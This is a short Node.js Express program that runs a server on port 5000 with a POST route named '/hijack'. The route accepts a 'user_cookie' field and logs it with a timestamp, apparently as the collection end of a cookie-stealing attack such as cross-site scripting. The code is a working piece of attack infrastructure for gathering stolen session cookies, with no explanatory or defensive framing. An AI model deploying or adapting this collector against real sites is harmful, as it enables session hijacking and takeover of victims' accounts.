var express = require("express");
var app = express();

var bodyParser = require('body-parser')
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ // for parsing application/x-www-form-urlencoded
  extended: true
}));

app.post('/hijack', function(req, res) {
  var user_cookie = req.body.user_cookie;
  var d = new Date();
  console.log(d.toTimeString() + ": " + user_cookie);
});

var server = app.listen(5000, function() {
  console.log("Listening on http://localhost:%s", server.address().port);
});
